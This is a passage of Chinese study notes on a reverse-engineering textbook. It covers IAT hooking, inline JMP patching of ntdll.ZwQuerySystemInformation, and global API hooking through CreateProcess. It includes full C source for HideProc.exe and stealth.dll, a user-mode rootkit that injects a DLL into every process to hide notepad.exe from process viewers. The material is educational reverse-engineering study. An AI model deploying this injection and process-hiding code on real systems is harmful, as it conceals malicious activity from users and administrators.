TRUE;\n&#125;\n\n\n保存user32.SetWindowTextW的地址\n\n\n在DLL_PROCESS_ATTACH事件中，先获取原始API的地址，保存为全局变量，后面会用到\n\n因为计算器已经加载了user32.dll，所以可以像上面这样直接GetProcAddress，但是实际操作中必须确定DLL已经正常加载了，再调用GetProcAddress\n\n\n\nIAT钩取\nhook_iat(\"user32.dll\", g_pOrgFunc, (PROC)MySetWindowTextW);\n\n\n把user32.SetWindowTextW的地址改成)MySetWindowTextW的地址。\n1 和2都是在发生DLL加载事件时执行的所有操作\n\n\nIAT脱钩\nhook_iat(\"user32.dll\", (PROC)MySetWindowTextW, g_pOrgFunc);\n\n\n卸载DLL时会发生DLL_PROCESS_DETACH事件，此时进行IAT脱钩，把hookiat.MtSetWindowTextW()的地址更改为user32.SetWindowTextW()的地址\n\nMySetWindowTextW()\n这是SetWindowTextW()的钩取函数\n\nBOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)\n&#123;\n    wchar_t* pNum = L\"零一二三四五六七八九\";\n    wchar_t temp[2] = &#123;0,&#125;;\n    int i = 0, nLen = 0, nIndex = 0;\n\n    nLen = wcslen(lpString);\n    for(i = 0; i &lt; nLen; i++)\n    &#123;\n        if( L'0' &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L'9' )\n        &#123;\n            temp[0] = lpString[i];\n            nIndex = _wtoi(temp);\n            lpString[i] = pNum[nIndex];\n        &#125;\n    &#125;\n\n    // user32!SetWindowTextW() 地址\n    return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);\n&#125;\n\n\n当调用user32.SetWindowTextW()时，现在会调用hookiat.MtSetWindowTextW()\n\nlpString参数是一个缓冲区，指示显示的字符串，上面分析过了，我直接操作缓冲区就可以了\n\n\n可以看到阿拉伯数字和缓冲区数字的尺寸是1:1的关系，这就不用修改缓冲区，很好！\n\n如果要是把”123”改成”ONETWOTHREE”，此时英文数字长的多，就不能用原来的缓冲区，要新开辟一块缓冲区\n\n\nQ： return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);\n\nfor循环结束后，调用return命令，返回到user32.dll!SetWindowTextW()的起始地址一条地址\n\nhook_iat()\n它是具体的钩取函数，主要的目的是把PE文件头中的IAT中的SetWindowsTextW()的地址改了，改成我自定义的API\n\nBOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)\n&#123;\n\tHMODULE hMod;\n\tLPCSTR szLibName;\n\tPIMAGE_IMPORT_DESCRIPTOR pImportDesc;  //这里面存储着IMAGE_IMPORT_DESCRIPTOR结构体的起始地址\n\tPIMAGE_THUNK_DATA pThunk;\n\tDWORD dwOldProtect, dwRVA;\n\tPBYTE pAddr;\n\n    // hMod, pAddr = ImageBase of calc.exe\n    //             = VA to MZ signature (IMAGE_DOS_HEADER)\n\thMod = GetModuleHandle(NULL);\n\tpAddr = (PBYTE)hMod; \n\n    // pAddr = VA to PE signature (IMAGE_NT_HEADERS)\n\tpAddr += *((DWORD*)&amp;pAddr[0x3C]);\n\n    // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table\n\tdwRVA = *((DWORD*)&amp;pAddr[0x80]);\n\n    // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table\n\tpImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);\n\n\tfor( ; pImportDesc->Name; pImportDesc++ )\n\t&#123;\n        // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name\n\t\tszLibName = (LPCSTR)((DWORD)hMod + pImportDesc->Name);\n\t\tif( !_stricmp(szLibName, szDllName) )//szDllName是传进来的user32.dll\n\t\t&#123;\n            // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk\n            //        = VA to IAT(Import Address Table)\n\t\t\tpThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + \n                                         pImportDesc->FirstThunk);\n\n            // pThunk->u1.Function = VA to API\n\t\t\tfor( ; pThunk->u1.Function; pThunk++ )\n\t\t\t&#123;\n\t\t\t\tif( pThunk->u1.Function == (DWORD)pfnOrg )\n\t\t\t\t&#123;\n                    // 更改内存属性为 E/R/W\n\t\t\t\t\tVirtualProtect((LPVOID)&amp;pThunk->u1.Function, \n                                   4, \n                                   PAGE_EXECUTE_READWRITE, \n                                   &amp;dwOldProtect);\n\n                    // 修改 IAT 值（钩取）\n                    pThunk->u1.Function = (DWORD)pfnNew;\n\t\t\t\t\t\n                    // 恢复内存属性\n                    VirtualProtect((LPVOID)&amp;pThunk->u1.Function, \n                                   4, \n                                   dwOldProtect, \n                                   &amp;dwOldProtect);\t\t\t\t\t\t\n\n\t\t\t\t\treturn TRUE;\n\t\t\t\t&#125;\n\t\t\t&#125;\n\t\t&#125;\n\t&#125;\n\n\treturn FALSE;\n&#125;\n\nQ：代码的前半部分是读取PE文件头的信息\nHMODULE hMod;\nLPCSTR szLibName;\nPIMAGE_IMPORT_DESCRIPTOR pImportDesc;  //这里面存储着IMAGE_IMPORT_DESCRIPTOR结构体的起始地址\nPIMAGE_THUNK_DATA pThunk;\nDWORD dwOldProtect, dwRVA;\nPBYTE pAddr;\n// hMod, pAddr = ImageBase of calc.exe\n//             = VA to MZ signature (IMAGE_DOS_HEADER)\nhMod = GetModuleHandle(NULL);\npAddr = (PBYTE)hMod;//等于ImageBase\n\n// pAddr = VA to PE signature (IMAGE_NT_HEADERS)\npAddr += *((DWORD*)&amp;pAddr[0x3C]); \n\n// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table\ndwRVA = *((DWORD*)&amp;pAddr[0x80]);\n\n// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table\npImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);// ImageBase + RVA，也就是在计算IDT的VA地址\n\n\n\n此时pImportDesc的值是01012B80\n\n接下来，在IDT中查找名为user32.dll，使用for循环遍历\n\nfor( ; pImportDesc->Name; pImportDesc++ )\n&#123;\n    // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name\n    szLibName = (LPCSTR)((DWORD)hMod + pImportDesc->Name);\n    if( !_stricmp(szLibName, szDllName) )\n\n找到后，进入user32的IAT 000010A4\n\n\n在010010A4处开始遍历\nfor( ; pThunk->u1.Function; pThunk++ )\n&#123;\n    if( pThunk->u1.Function == (DWORD)pfnOrg )//pfnOrg是传入的值，应为SetWindowTextW\n\n\n\n\n\n\n\n\n找到IAT地址是01001110，fuction地址是77CF61C9\n\n接着要修改这个值，改成pfnNew，也就是10001000 hookiat.MySetWindowTextW()的地址，这样就修改成功了\n// 更改内存属性为 E/R/W\nVirtualProtect((LPVOID)&amp;pThunk->u1.Function, \n               4, \n               PAGE_EXECUTE_READWRITE, \n               &amp;dwOldProtect);\n\n// 修改 IAT 值（钩取）\npThunk->u1.Function = (DWORD)pfnNew;\n\n// 恢复内存属性\nVirtualProtect((LPVOID)&amp;pThunk->u1.Function, \n               4, \n               dwOldProtect, \n               &amp;dwOldProtect);\t\t\t\t\n\n\n这里的VirtualProtect()函数用来更改内存区域的模式，把相应的IAT区域改成”可读写”模式，钩取之后，再重新返回原模式。\n\n\n\n32.6 调试被注入的DLL文件Q：调试步骤\n\n用Ollydbg2.0进行调试，这个证明有问题。我又重新下载了一个Ollydbg201，这回可以了。\n\n首先把calc.exe附加(attach)到Ollydbg，查看calc.exe的pid\n\n附加成功后，设置Ollydbg选项，这里表示每当有DLL加载(含注入)到被调试进程时，控制权就会转移到调试器。\n\n\n运行InjectDll.exe，此时调试器会在hookiat.dll的EP处停下来\n\n\n\n\n\n\n\n\n提示\n有DLL被加载时，调试器会自动暂停在被加载的DLL的EP处，这是OllyDbg2.0中提供的功能。若使用的是 OllyDbg1.1,调试器会在非 EP 的其他代码位置处(ntdll.dll区域)暂停。\n\n\nQ: 在hookiat.dll的DllMain()函数中查找API\n\n此时断点停在这，进入到了hookiat的ep\n\n\n\n现在我想找到DllMain，因为DllMain中用到了SetWindowTextW，所以搜索字符串，发现SetWindowTextW\n\n\n定位到SetWindowTextW，此时这部分的结构和Main函数是一样的，6C901130就是DllMain的起始地址\n\n\n\n调试DllMain\n在运行到6C901160这条指令时，可以发现此时栈内只有两个参数，根据前面函数的定义，此处省略了user32.dll字符串。\n\n这是VC++编辑器优化的结果，字符串的地址并未作为参数传入，还被硬编码到hook_iat()函数中。\n\n\n\n\n调试hook_iat()\n进入函数，前面在push参数，push的是pe头相关的参数，此时EDI的值是01000000，也就是IMAGE_DOS_HEADER的起始地址，也就是整个PE头的起始地址\n\n\nEDI + 3C，是因为DOS头的长度是固定的64bytes，且最后一个存储的是NT头的偏移，这样就可以获取它的值\n\n\n\n\n\n此时EAX是000000F0，EDI + EAX + 80 得到的值是0100170，也就是在获取IMAGE_OPTIONAL_HEADER的datadirectory数组的第二个值，也就是在获取IAT的地址，DS:[EDI + EAX + 80] &#x3D;&#x3D;  12B80\n\n\n\n找到idt之后，遍历idt，知道找到user32.dll，地址6C9010CA处是在调用stricmp函数。\n\n\n\n\n\n有两层循环，外层是在比较是不是user32.dll，内层循环在比较是不是SetWindowTextW()\n\n\n从user32.dll的第一个API  GetMenu开始遍历\n\n\n\n\n\nQ：找到之后，更改内存属性\n\nQ：修改值\n\n把原来SetWindowTextW()的值，此时的Entrypoint是当前函数的入口，也就是我新写的函数\n\n\n\n改完之后，就变成了\n\n\n\nMySetWindowTextW()\n在calc.exe中搜索intermodular calls，找到两处SetWindowsTextW()，给他们打上断点，\n\n\n运行前面的Inject.exe &lt; pid &gt; i  hookiat.dll，此时不要设置events中的pause on new module (dll)\n\n之后运行cal.exe，并在计算器上输入8，发现停在了断点处，此时原本的user32.SetWindowTextW()位置的值已经被改成了我新构造的值 \n\n\n进入函数，发现把我输入的8传了进来，最后又重新调用了SetWindowTextW()函数\n\n​\t\n\n\n0x33 隐藏进程本章将通过修改API代码实现API钩取。此外，还又用上述方法隐藏特定进程的技术\n\n\n\n\n\n\n提示\n隐藏进程(stealth process)在代码逆向分析领域中的专业术语为 Rootkit，它是指通过修改(hooking)系统内核来隐藏进程、文件、注册表等的一种技术。\nRootkit 的相关内容不在本章讲解范围内，为便于理解，本书中将统一使用“隐藏进程”这一名称。\n\n\n33.1 技术图表\n\n库文件被加载到进程内存后，在目录映像中直接修改要钩取的API代码。\n前面的IAT钩取，需要我钩取的API在进程的IAT中，API修改不需要\n\n33.2 API代码修改技术的原理\n将API代码的前5个字节修改为IMP XXXXXXXX指令来钩取API。调用执行别钩取的API时，修改后的JMP XXXXXXXX指令就会被执行，转而控制hooking函数。\n\n钩取之前Q：钩取之前正常调用API的情形\n\n00422CF7处的指令调用 ntdll.ZwQuerySystemInformation() API后，查找IAT，跳到7C93D92E\nAPI执行完毕后，返回到调用代码的下一条指令的地址\n\n\n钩取之后\n首先把stealth.dll注入目标进程procexp.exe，钩取ntdll.ZwQuerySystemInformation()  API. 该API的起始地址的前5个bytes代码被修改成JMP 10001120。只修改5个字节的代码\n10001120是stealth.MyZwQuerySystemInformation()函数的地址。\n\nQ：此时在procexp.exe中调用ntdll.ZwQuerySystemInformation()  API的流程为\n\n调用ntdll.ZwQuerySystemInformation()  API后，就会进入到7C93D92E处\n接着IMP到10001120处，之后执行CALL unhook()脱钩，把ntdll.ZwQuerySystemInformation()  API的前5个字节恢复成原值\n接着调用CALL EAX，执行正常的API调用，retn到stealth.dll\n再次执行CALL hook()，也就是把ntdll.ZwQuerySystemInformation()  API 前5个字节修改了，之后正常返回\n\n\n使用API代码修改，可以钩取任意的API\n\n\n\n\n\n\n提示\nAPI代码修改就是直接修改映射到目标进程内存空间的系统DLL的代码。进程的其他线程正在读某个函数时，如果尝试修改它的代码，会引发非法访问异常。\n\n\n33.3 进程隐藏\n用户模式下最常用的是ntdll.ZwQuerySystemInformation() API钩取技术\n\n工作原理\n为了隐藏某个特定进程，要潜入所有其他进程内存，钩取相关API\n我理解是就当成正常dll库，不搞特殊化\n\n\n作者举了一个例子是，普通战斗机升空后，如果把雷达搞坏，那普通战斗机就变成了隐形战斗机\n\n相关API\nQ：由于进程是内核对象，所以用户模式下的程序只要通过相关API就能检测到他们\n\nCreateToolhelp32Snapshot() &amp; EnumProcess()\n\n这两个API在内部都调用了ntdll.ZwQuerySystemInformation()  API\n\n\n\nZwQuerySystemInformation()\n​                                                                   \n\n\n\nQ：借助ZwQuerySystemInformation() API可以获取运行中的所有进程信息，形成一个链表\n\n操作这个链表可以隐藏相关进程\n\n在用户模式下不需要分别钩取CreateToolhelp32Snapshot() 和  EnumProcess()，只需要钩取ZwQuerySystemInformation()  API，就可以隐藏指定进程\n\n也就是链表里记录了现在所有运行中的进程信息，我把想要隐藏的进程从链表里删除了，那就相当于隐藏进程了，所以作者说操纵的是雷达，不是飞机\n\n\n隐藏技术的问题Q：假设要隐藏的进程为test.exe\n\n那么我钩取运行中的ProcExp.exe（或者taskmgr.exe）进程的ZwQuerySystemInformation() API，那么就无法查找到test.exe\n这样test.exe就对ProcExp.exe隐藏了\n\n\n\n\n\n\n\n提示\nProcExp.exe 进程查看器\ntaskmgr.exe  任务管理器\n\n\nQ：但是上述方法存在问题\n问题1：可以检索进程的工具只有这两个嘛？\n\n不是的，除了这两个还有其他的。那如果我想隐藏一个进程，就需要钩取所有可以查看进程的工具(进程)\n\n问题2：新创建的进程\n\n如果用户再运行一个ProcExp.exe，仍然能看到test.exe。因为我只钩取了第一个ProcExp.exe，并没有钩取第二个\n\nQ：解决上述问题的方法：全局钩取\n\n隐藏test.exe进程时，需要钩取系统中运行的所有进程的ZwQuerySystemInformation() API\n并且对后面要启动的进程，同样这姓这个操作\n这就是全局钩取，指的是在整个系统范围内操作\n\n33.4 练习 HideProc.exe, stealth.dll\nHideProc.exe负责把stealth.dll文件注入所有运行中的进程\nstealth.dll 负责钩取(注入stealth.dll）进程的ntdll.ZwQuertSystemInformation()  API\n用这两个文件隐藏notepad.exe进程\n\n33.5 源代码分析HideProc.cpp\nHideProc.exe负责向运行中的所有进程注入&#x2F;卸载指定的DLL文件\n在原有的InjectDll.exe的基础上，添加了向所有进程注入DLL的功能\n\nInjectAllProcess()\n它会检索运行中的所有进程，然后将指定DLL注入各进程或从各进程卸载\nBOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)\n&#123;\n\tDWORD                   dwPID = 0;\n\tHANDLE                  hSnapShot = INVALID_HANDLE_VALUE;\n\tPROCESSENTRY32          pe;\n\tBOOL ret;\n\t// Get the snapshot of the system\n\tpe.dwSize = sizeof( PROCESSENTRY32 );\n\thSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );\n\n\t// find process\n\tProcess32First(hSnapShot, &amp;pe);\n\tdo\n\t&#123;\n\t\tdwPID = pe.th32ProcessID;\n\n        // 对于PID小于100的进程，不进行注入\n\t\tif( dwPID &lt; 1000 )\n\t\t\tcontinue;\n\n        if( nMode == INJECTION_MODE )\n\t\t    ret = InjectDll(dwPID, szDllPath);\n\t\t\tif(ret)\n\t\t\t\tprintf(\"OpenProcess(%d) success!!!\\n\", dwPID);\n        else\n            EjectDll(dwPID, szDllPath);\n\t&#125;\n\twhile( Process32Next(hSnapShot, &amp;pe) );\n\n\tCloseHandle(hSnapShot);\n\n\treturn TRUE;\n&#125;\n\n\n首先用\thSnapShot &#x3D; CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); 获取系统中运行的所有进程的列表\n\n然后用Process32First和Process32Next  API把获得的进程信息放到PROCESSENTRY32结构体中\n\n各个函数定义\n\n\n\n获取进程pid后，根据nmode判断是inject dll还是enject dll\n\n系统进程的pid一般都小于100，为了保证安全性，不向这些进程注入dll文件\n\n\n\n\n\n\n\n\n\n提示\n只有先提升HideProc.exe进程的权限，才可以准确获得所有进程的列表。因此在main函数中，使用SetPrivilege函数提升了权限\n\n\nmain函数int _tmain(int argc, TCHAR* argv[])\n&#123;\n    int                     nMode = INJECTION_MODE;\n    HMODULE                 hLib = NULL;\n    PFN_SetProcName         SetProcName = NULL;\n\n\tif( argc != 4 )\n\t&#123;\n\t\tprintf(\"\\n Usage  : HideProc.exe &lt;-hide|-show> \"\\\n               \"&lt;process name> &lt;dll path>\\n\\n\");\n\t\treturn 1;\n\t&#125;\n\n\t// change privilege\n    SetPrivilege(SE_DEBUG_NAME, TRUE);\n\n    // load library\n    // stealth.dll\n    hLib = LoadLibrary(argv[3]);\n\n    // set process name to hide\n    // notepad.exe\n    SetProcName = (PFN_SetProcName)GetProcAddress(hLib, \"SetProcName\");\n    SetProcName(argv[2]);\n\n    // Inject(Eject) Dll to all process\n    if( !_tcsicmp(argv[1], L\"-show\") )\n\t    nMode = EJECTION_MODE;\n\n    InjectAllProcess(nMode, argv[3]);\n\n    // free library\n    FreeLibrary(hLib);\n\n\treturn 0;\n&#125;\n\nstealth.cppSetProcName实际的API注入由Stealth.dll负责，下面分析源代码\n#pragma comment(linker, \"/SECTION:.SHARE,RWS\")\n#pragma data_seg(\".SHARE\")\n    TCHAR g_szProcName[MAX_PATH] = &#123;0,&#125;;\n#pragma data_seg()\n\n\n第一条命令：告诉编译器在链接时创建一个名为.SHAARE的section，并把它的属性设置为R 可读 W 可写  S 可共享，这个共享内存段可以被不同的进程访问，从而实现进程间通信\n第二条命令：将下面的全局变量放在.SHARE的section中\n也就是把g_szProcName放在这个section中\n\n\n第三条命令：定义一个全局变量，字符数组，长度为MAX_PATH\n第四条命令：这个编译指令将数据段的放置恢复为默认设置。它告诉编译器将后续的全局变量放置回默认的数据节中。\n\n#ifdef __cplusplus\nextern \"C\" &#123;\n#endif\n__declspec(dllexport) void SetProcName(LPCTSTR szProcName)\n&#123;\n    _tcscpy_s(g_szProcName, szProcName);\n&#125;\n#ifdef __cplusplus\n&#125;\n#endif\n\n\n导出函数SetProcName()，将要隐藏的进程名称保存到g_szProcName\n\n\n\n\n\n\n\n提示\n在共享内存节区创建g_szProcName缓冲区的好处在于，steath.dll被注入所有进程时，可以彼此共享隐藏进程的名称\n\n\nDllMain()BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n    char            szCurProc[MAX_PATH] = &#123;0,&#125;;\n    char            *p = NULL;\n\n    // #1. 异常处理\n    // 若当前进程为 HookProc.exe ，则中止，不进行钩取操作\n    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);\n    p = strrchr(szCurProc, '\\\\');\n    if( (p != NULL) &amp;&amp; !_stricmp(p+1, \"HideProc.exe\") )\n        return TRUE;\n\n    switch( fdwReason )\n    &#123;\n        // #2. API Hooking\n        case DLL_PROCESS_ATTACH : \n\t\t\thook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);\n\t\t\tbreak;\n\n        // #3. API Unhooking \n        case DLL_PROCESS_DETACH :\n\t\t\tunhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);\n\t\t\tbreak;\n    &#125;\n\n    return TRUE;\n&#125;\n\n\n首先比较字符串，如果进程名是HideProc.exe，那就不钩取API\n发生DLL_PROCESS_ATTACH时，调用hook_by_code钩取API\nDLL_PROCESS_DETACH时，脱钩\n\nhook_by_codeQ：参数介绍\n\nLPCSTR szDllName：[IN]包含要钩取的API的DLL文件名称\nLPCSTR szFuncName：[IN]要钩取的API名称\nPROC pfnNew：[IN]用户提供的钩取函数地址\nPBYTE pOrgBytes：[OUT]存储原来5个字节的缓冲区，后面脱钩使用\n\nBOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)\n&#123;\n    FARPROC pfnOrg;\n    DWORD dwOldProtect, dwAddress;\n    BYTE pBuf[5] = &#123;0xE9, 0, &#125;;\n    PBYTE pByte;\n\n    // 要钩取的API地址：ntdll.ZwQuerySystemInformation\n    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\n    pByte = (PBYTE)pfnOrg;\n\n    // 如果已经被钩取，那么 return FALSE（E9是jmp的指令）\n    if( pByte[0] == 0xE9 )\n        return FALSE;\n\n    // 为了修改5个字节，先向内存添加\"写\"属性\n    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\n    // 备份原有代码 (5 byte)\n    memcpy(pOrgBytes, pfnOrg, 5);\n\n    // 计算JMP地址，(E9 XXXX)\n    // => XXXX = pfnNew - pfnOrg - 5\n\t// Jmp相对地址=原来地址的下一条指令的地址-要跳转指令的地址\n    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;\n    memcpy(&amp;pBuf[1], &amp;dwAddress, 4);\n\n    // Hook - 修改 5 byte (JMP XXXX)\n    memcpy(pfnOrg, pBuf, 5);\n\n    // 回复内存属性\n    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &amp;dwOldProtect);\n    \n    return TRUE;\n&#125;\n\nQ：jMP地址的计算\n\n指令格式为\n\nJMP  xxxxxxx\n\n\n根据 Intel X86 (IA-32)指令格式，JMP指令对应的操作码是E9，后面跟着4bytes的地址。所以总长度是5bytes\nxxxxxxx是相对地址，他应该怎么计算呢？\nxxxxxxx &#x3D; 要跳转的地址(VA) - 当前指令地址 - 当前指令长度(5)s\n所以这个是相对地址是相对指令结束位置的地址\n\n\n\n\n\n\n\n\n\n提示\n除了JMP指令之外，也可以用short JMP命令，它是进行短距离跳转，对应的IA-32指是”EB XX”，指令长度为2bytes.\nJMP每次都要计算相对地址，很不方便，也可以用绝对地址跳转。\n\n\n\nQ：实际的ZwQuerySystemInformation() API由hook_by_code()函数完成，下面进行调试\n\n这里我没调出来，找不到API的位置，我也无法注入\n\nunhook_by_code()\n是取消钩取的函数，主要是把前5个字节恢复成原值\nBOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)\n&#123;\n    FARPROC pFunc;\n    DWORD dwOldProtect;\n    PBYTE pByte;\n\n    // 获得API地址：ntdll.ZwQuerySystemInformation\n    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\n    pByte = (PBYTE)pFunc;\n\n    // 如果已经脱钩，则 return FALSE\n    if( pByte[0] != 0xE9 )\n        return FALSE;\n\n    // 为了修改5个字节，先向内存添加\"写\"属性\n    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\n\n    // Unhook\n    memcpy(pFunc, pOrgBytes, 5);\n\n    // 回复内存属性\n    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);\n\n    return TRUE;\n&#125;\n\nNewZwQuerySystemInformationQ：先看下ntdll.ZwQueryInformation() API\n\n\nSystemInformationClass设置为SystemInformationClass(5)后，调用ZwQuerySystemInformation()  API \nSystemInformation[in&#x2F;out]参数中存储的是SYSTEM_PROCESS_INFORMATION结构体单向链表。\n这个结构体链表中存储着运行中的所有进程的信息\n所以隐藏某个进程之前，要先查找对应的链表成员，然后断开其与链表的连接\n\nQ：NewZwQueryInformation()函数\nNTSTATUS WINAPI NewZwQuerySystemInformation(\n                SYSTEM_INFORMATION_CLASS SystemInformationClass, \n                PVOID SystemInformation, \n                ULONG SystemInformationLength, \n                PULONG ReturnLength)\n&#123;\n    NTSTATUS status;\n    FARPROC pFunc;\n    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;\n    char szProcName[MAX_PATH] = &#123;0,&#125;;\n    \n    // 开始前先脱钩 unhook\n    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);\n\n    // 调用 original API\n    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), \n                           DEF_ZWQUERYSYSTEMINFORMATION);\n    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)\n              (SystemInformationClass, SystemInformation, \n              SystemInformationLength, ReturnLength);\n\n    if( status != STATUS_SUCCESS )\n        goto __NTQUERYSYSTEMINFORMATION_END;\n\n    // 仅针对 SystemProcessInformation\n    if( SystemInformationClass == SystemProcessInformation )\n    &#123;\n        // SYSTEM_PROCESS_INFORMATION 类型转换\n        // pCur 是单链表的头\n        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;\n\n        while(TRUE)\n        &#123;\n            // 比较进程名称\n            // g_szProcName 为要隐藏的进程名称\n            // (=> 在SetProcName()中设置)\n            if(pCur->Reserved2[1] != NULL)\n            &#123;\n                if(!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))\n                &#123;\n                    // 从链表中删除要隐藏的进程\n                    if(pCur->NextEntryOffset == 0)\n                        pPrev->NextEntryOffset = 0;\n                    else\n                        pPrev->NextEntryOffset += pCur->NextEntryOffset;\n                &#125;\n                else\t\t\n                    pPrev = pCur;\n            &#125;\n\n            if(pCur->NextEntryOffset == 0)\n                break;\n\n            // 链表的下一项\n            pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);\n        &#125;\n    &#125;\n\n__NTQUERYSYSTEMINFORMATION_END:\n\n    // 再勾上 API\n    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, \n                 (PROC)NewZwQuerySystemInformation, g_pOrgBytes);\n\n    return status;\n&#125;\n\n\n脱钩，call_unhook()\n调用ZwQuerySystemInformation\n查找要隐藏的进程\n从链表中移除\nHook ZwQuerySystemInformation\n\n这个原理和前面说的一样\n33.6 全局API钩取Q：33.5中实现了进程隐藏，只是针对特定进程实现了API钩取，并未实现全局API钩取\n\n对于新的proc.exe，notepad.exe仍然是可见的，因此需要用全局API钩取\n\n全局API钩取也是一种API钩取，它针对的进程为当前所有的进程和将来要运行的进程\n\n\nKernel32.CreateProcess()  API\n这个API用来创建新进程，其他启动运行进程的API (WinExc、ShellExecute()、system())在其内部也调用的是CreateProcess函数\n\n\n\nQ：那思路就来了\n\n如果我向当前所有的进程注入stealth.dll，除了钩取ZwQuerySystemInformation，我把CreateProcess API也钩取了，那之后所有的进程自动注入stealth.dll\n因为所有的进程都是通过父进程(通常是explorer.exe)调用CreateProcess创建的。那我钩取了父进程的CreateProcess()  API，就可以把stealth.dll文件注入所有子进程\n\nQ：钩取CreateProcess() API,要考虑以下几个方面\n\n钩取CreateProcess() API时，还要钩取kernel32.CreateProcessA()和kernel32.CreateProcessW()\nCreateProcess()A、CreateProcessW()内部又分别调用了CreateProcessInternalA()、CreateProcessInternalW()函数。有的进程也会调用这两个函数，所以也要把这两个API钩取。钩取时，尽可能钩取低级API\n钩取函数要钩取调用CreateProcess而创建的子进程的API。因此，很短时间内，子进程可能在未钩取的状态下运行\n\nNtdll.ZwResumeThread()  APIQ：Ntdll.ZwResumeThread() 函数\n\n\n这个函数在进程创建后、主线程运行前被调用前执行，在CreateProcess() APi内部调用执行\n所以只要钩取这个函数，就可以在不运行子进程代码的状态下钩取API\n但是ZwResumeThread() 是一个未公开的API，因此可能随着os补丁升级，这个API就更改了，可能在低版本可以钩取，突然在高版本就不行了。\n\n33.7 练习HideProc2.exe,Stealth2.dll\nStealth2.dll用来钩取CreateProcess，钩取ZwResumeThread\n\n复制stealth2.dll文件到%SYSTEM%文件夹下\n我这个一直显示Open process failed\n\n33.8 源代码分析stealth2.cpp Q：和前面stealth.cpp相比的区别\n\n将要隐藏的进程名称硬编码为notepad.exe，并且添加了钩取CreateProcess()  API的代码和 CreateProcessW() API的代码\n\nDllMain()BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n&#123;\n    char            szCurProc[MAX_PATH] = &#123;0,&#125;;\n    char            *p = NULL;\n\n    // 异常处理使注入不会发生在HideProc2.exe进程\n    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);\n    p = strrchr(szCurProc, '\\\\');\n    if( (p != NULL) &amp;&amp; !_stricmp(p+1, \"HideProc2.exe\") )\n        return TRUE;\n\n    // change privilege\n    SetPrivilege(SE_DEBUG_NAME, TRUE);\n\n    switch(fdwReason)\n    &#123;\n        case DLL_PROCESS_ATTACH : \n            // hook\n            hook_by_code(\"kernel32.dll\", \"CreateProcessA\", (PROC)NewCreateProcessA, g_pOrgCPA);\n            hook_by_code(\"kernel32.dll\", \"CreateProcessW\", (PROC)NewCreateProcessW, g_pOrgCPW);\n            hook_by_code(\"ntdll.dll\", \"ZwQuerySystemInformation\", (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);\n            break;\n\n        case DLL_PROCESS_DETACH :\n            // unhook\n            unhook_by_code(\"kernel32.dll\", \"CreateProcessA\", g_pOrgCPA);\n            unhook_by_code(\"kernel32.dll\", \"CreateProcessW\", g_pOrgCPW);\n            unhook_by_code(\"ntdll.dll\", \"ZwQuerySystemInformation\", g_pOrgZwQSI);\n            break;\n    &#125;\n\n    return TRUE;\n&#125;\n\n\n新增了hook CreateProcessA和hook  CreateProcessW\n\nNewCreateProcessA()\n和之前的基本一样， 是钩取CreateProcessA() API的函数\n\nBOOL WINAPI NewCreateProcessA(\n    LPCTSTR lpApplicationName,\n    LPTSTR lpCommandLine,\n    LPSECURITY_ATTRIBUTES lpProcessAttributes,\n    LPSECURITY_ATTRIBUTES lpThreadAttributes,\n    BOOL bInheritHandles,\n    DWORD dwCreationFlags,\n    LPVOID lpEnvironment,\n    LPCTSTR lpCurrentDirectory,\n    LPSTARTUPINFO lpStartupInfo,\n    LPPROCESS_INFORMATION lpProcessInformation\n)\n&#123;\n    BOOL bRet;\n    FARPROC pFunc;\n\n    // unhook\n    unhook_by_code(\"kernel32.dll\", \"CreateProcessA\", g_pOrgCPA);\n\n    // 调用原始 API\n    pFunc = 